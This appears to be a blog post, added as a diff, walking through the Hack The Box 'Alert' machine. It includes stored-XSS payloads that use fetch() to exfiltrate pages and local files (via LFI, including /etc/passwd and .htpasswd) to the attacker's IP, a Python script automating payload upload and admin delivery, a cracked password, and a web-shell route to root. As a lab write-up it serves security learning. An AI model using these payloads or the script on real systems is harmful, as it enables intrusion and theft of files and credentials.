@@ -1,0 +1,186 @@
+---
+layout: post
+title:  "[HTB] Alert"
+date:   2024-12-06
+categories: CTF
+---
+
+As usual let us start with our nmap scan
+
+---
+└─$ nmap 10.10.11.44          
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-12-06 03:48 EST
+Nmap scan report for alert.htb (10.10.11.44)
+Host is up (0.064s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+---
+
+Seeing that we only have ports 22 and 80 here, highly likely our initial access will come from port 80. So let us visit port 80 and see that this is a markdown viewer of some sort wherein we can upload md files.
+
+![alt text](/assets/uploads/htb-alert/image.png)
+
+Trying to upload an md file, we see that it doesnt filter out any html and script tags, and it generates a share link for us. So we can leverage this by creating an XSS payload and sending this to the admin side. But how can we send this to the admin side?  
+
+![alt text](/assets/uploads/htb-alert/image-2.png)
+
+![alt text](/assets/uploads/htb-alert/image-1.png)
+
+Upon looking at the web application, we see that there is a contact us feature which is exactly what we need. 
+
+![alt text](/assets/uploads/htb-alert/image-3.png)
+
+We can more or less deduce that our path would be to create a blind XSS payload and send it to the admin side and gain more information about the machine. 
+
+To try this hypothesis, we create a basic blind xss payload as follows `<script src="//10.10.14.32/zw1tt3r1on.test"></script>`. When we try and upload this file and share it to the admin side by the contact us page, we see that we get a callback from the server
+
+![alt text](/assets/uploads/htb-alert/image-4.png)
+
+From here, we can craft a specific payload to try and fetch the homepage and send the data back to us
+
+---
+<script>
+fetch("http://alert.htb/")
+  .then(response => response.text()) // Convert the response to text
+  .then(data => {
+    fetch("http://10.10.14.32/?data=" + encodeURIComponent(data)); // Exfiltrate data
+  })
+  .catch(error => console.error("Error fetching the messages:", error));
+</script>
+---
+
+We discover now that there is a hidden endpoint called "messages" which corresponds to messages.php.
+
+![alt text](/assets/uploads/htb-alert/image-5.png)
+
+Trying to fetch this messages.php gives us an interesting parameter called "file". 
+
+<script>
+fetch("http://alert.htb/messages.php")
+  .then(response => response.text()) // Convert the response to text
+  .then(data => {
+    fetch("http://10.10.14.32/?data=" + encodeURIComponent(data)); // Exfiltrate data
+  })
+  .catch(error => console.error("Error fetching the messages:", error));
+</script>
+---
+
+![alt text](/assets/uploads/htb-alert/image-6.png)
+
+Testing this file parameter, we discover that this is vulnerable to a LFI. We can now use this to fetch files within the machine. Sample below is fetching the /etc/passwd file on the machine.
+
+---
+<script>
+fetch("http://alert.htb/messages.php?file=../../../../../../etc/passwd")
+  .then(response => response.text()) // Convert the response to text
+  .then(data => {
+    fetch("http://10.10.14.32/?data=" + encodeURIComponent(data)); // Exfiltrate data
+  })
+  .catch(error => console.error("Error fetching the messages:", error));
+</script>
+---
+
+![alt text](/assets/uploads/htb-alert/image-7.png)
+
+Now we just need to enumerate the machine and look for interesting files. For this, I create a very simple python script to automatically upload the md file and send the link to the contact us page as shown below
+
+---
+import requests, re
+
+def send_to_contact(file_name):
+    burp0_url = "http://alert.htb:80/contact.php"
+    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://alert.htb", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,/assets/uploads/htb-alert/image/avif,/assets/uploads/htb-alert/image/webp,/assets/uploads/htb-alert/image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://alert.htb/index.php?page=contact&status=Message%20sent%20successfully!", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
+    burp0_data = {"email": "jl@jl.com", "message": file_name}
+    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
+
+
+def send_md_request(file_path):
+    burp0_url = "http://alert.htb:80/visualizer.php"
+    burp0_headers = {
+        "Cache-Control": "max-age=0",
+        "Upgrade-Insecure-Requests": "1",
+        "Origin": "http://alert.htb",
+        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJFBXbjnjqVK66x3C",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,/assets/uploads/htb-alert/image/avif,/assets/uploads/htb-alert/image/webp,/assets/uploads/htb-alert/image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Referer": "http://alert.htb/index.php?page=alert",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "close"
+    }
+    burp0_data = f"""------WebKitFormBoundaryJFBXbjnjqVK66x3C\r\nContent-Disposition: form-data; name="file"; filename="jltest.md"\r\nContent-Type: text/markdown\r\n\r\n<script>
+fetch("http://alert.htb/messages.php?file={file_path}")
+  .then(response => response.text()) // Convert the response to text
+  .then(data => {{
+    fetch("http://10.10.14.32/?d1=" + encodeURIComponent(data)); // Exfiltrate data
+  }})
+  .catch(error => console.error("Error fetching the messages:", error));
+</script>\r\n------WebKitFormBoundaryJFBXbjnjqVK66x3C--\r\n"""
+    response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
+
+    regex_template = r'href="(http://alert\.htb/visualizer\.php\?link_share=[^"]+)"'
+    match = re.search(regex_template, str(response.text))
+    url = match.group(1)
+    print('sending url: ', url)
+    send_to_contact(url)
+
+while True:
+    send_md_request(input('enter path: '))
+
+---
+
+![alt text](/assets/uploads/htb-alert/image-8.png)
+
+Looking at the 000-default.conf file, we see that there is another subdomain called statistics
+
+![alt text](/assets/uploads/htb-alert/image-10.png)
+
+![alt text](/assets/uploads/htb-alert/image-9.png)
+
+Visiting the statistics subdomain gives us a basic auth login 
+
+![alt text](/assets/uploads/htb-alert/image-11.png)
+
+Since we have a way to read local files within the machine, we can read the .htpasswd file of statistics.alert.htb at /var/www/statistics.alert.htb/.htpasswd and we get the credentials of the user "albert"
+
+![alt text](/assets/uploads/htb-alert/image-13.png)
+
+![alt text](/assets/uploads/htb-alert/image-12.png)
+
+Cracking this hash, we get the password is "manchesterunited". 
+
+![alt text](</assets/uploads/htb-alert/2024-12-06 16_28_45.png>)
+
+We can now use this to login using ssh and we get our user flag
+
+![alt text](/assets/uploads/htb-alert/image-16.png)
+
+Looking for possible privilege escalation pathways, we observe that there is a php process running serving files on port 8080 as root. 
+
+![alt text](</assets/uploads/htb-alert/2024-12-06 16_42_12.png>)
+
+So we port forward this using ssh and take a look at what it is exactly running
+
+![alt text](/assets/uploads/htb-alert/image-14.png)
+
+![alt text](/assets/uploads/htb-alert/image-15.png)
+
+Since it is serving files on the /opt/website-monitor directory, we just need to find a way to write something in the /opt/website-monitor and get a php shell.
+
+![alt text](/assets/uploads/htb-alert/image-17.png)
+
+Since we know that we can write in the config and monitors folder, let us quickly write a php web shell and visit that page 
+
+![alt text](/assets/uploads/htb-alert/image-18.png)
+
+![alt text](/assets/uploads/htb-alert/image-19.png)
+
+From here we can just get a reverse shell using our web shell and get the root flag, or just simply cat the root flag using this web shell
+
+![alt text](/assets/uploads/htb-alert/image-20.png)
+
+Pwned!!
+
+![alt text](/assets/uploads/htb-alert/image-21.png)
